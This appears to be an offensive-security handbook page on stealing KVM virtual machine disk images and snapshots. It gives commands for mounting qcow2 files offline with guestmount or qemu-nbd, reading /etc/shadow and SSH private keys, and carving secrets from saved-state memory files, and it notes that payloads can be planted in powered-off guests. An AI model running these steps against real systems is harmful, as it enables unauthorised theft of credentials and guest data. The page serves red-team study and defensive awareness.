---
title: "Disk and snapshot theft: taking qcow2 images and saved state"
description: "KVM guests use qcow2 (or raw) disk images and store snapshots inside the qcow2 or as external overlays, with saved VM state holding memory. Access to the image files lets an attacker read the guest filesystem offline with libguestfs or qemu-nbd, extracting credentials and data without entering the VM, and read saved-state memory for secrets captured at snapshot time."
keywords:
  - qcow2
  - qemu-nbd
  - libguestfs
  - snapshot
  - offline access
---

# Disk and snapshot theft

KVM virtual machines store their disks as qcow2 or raw image files, with internal snapshots kept inside the qcow2 or as external overlay files, and saved VM state (including memory) written on managed save or snapshot. Access to those files, on the host, an image store, or a backup, lets an attacker read the guest filesystem offline and extract everything in it with no login and no in-guest defenses. Saved-state files additionally capture guest memory, so secrets live at save time are recoverable.

## Locate and mount images

```bash
# typical locations
ls -l /var/lib/libvirt/images/ /var/lib/vz/images/ 2>/dev/null
virsh domblklist <dom>                         # which image backs a domain
# read a qcow2 offline with libguestfs (handles qcow2 and snapshots natively)
guestmount -a disk.qcow2 -i --ro /mnt/guest
cat /mnt/guest/etc/shadow /mnt/guest/root/.ssh/id_* 2>/dev/null
# or expose it as a block device with qemu-nbd and mount a partition
modprobe nbd; qemu-nbd --connect=/dev/nbd0 --read-only disk.qcow2
fdisk -l /dev/nbd0; mount -o ro /dev/nbd0p1 /mnt/guest
```

## Snapshots and saved state

```bash
# internal snapshots inside a qcow2
qemu-img snapshot -l disk.qcow2
# external snapshot overlays chain to a backing file; mount the active overlay
qemu-img info --backing-chain disk-overlay.qcow2
# saved VM state (virsh managedsave / snapshot with memory) holds guest RAM
ls -l /var/lib/libvirt/qemu/save/*.save 2>/dev/null   # carve for in-memory secrets
```

## Exploitation notes

- Offline mounting with `guestmount` or `qemu-nbd` sidesteps all guest-side controls; prioritise the Windows SAM/SYSTEM hives or Linux `/etc/shadow` and SSH/cloud keys that unlock other systems.
- External snapshot overlays require the backing chain to read the current state; `qemu-img info --backing-chain` shows the full chain to assemble.
- Saved-state files are a memory image at save time and contain decrypted secrets; carve them with a memory-forensics tool.
- Write access to images enables pre-boot tampering: inject a startup payload into a powered-off VM's filesystem. File access alone is full guest-data theft for every VM in the store.

## Tools

- [libguestfs / guestmount](https://libguestfs.org/)
- [qemu-img and qemu-nbd](https://www.qemu.org/docs/master/tools/)

## References

- [QEMU qcow2 and disk images](https://www.qemu.org/docs/master/system/images.html)
- [libvirt: managing snapshots](https://libvirt.org/formatsnapshot.html)
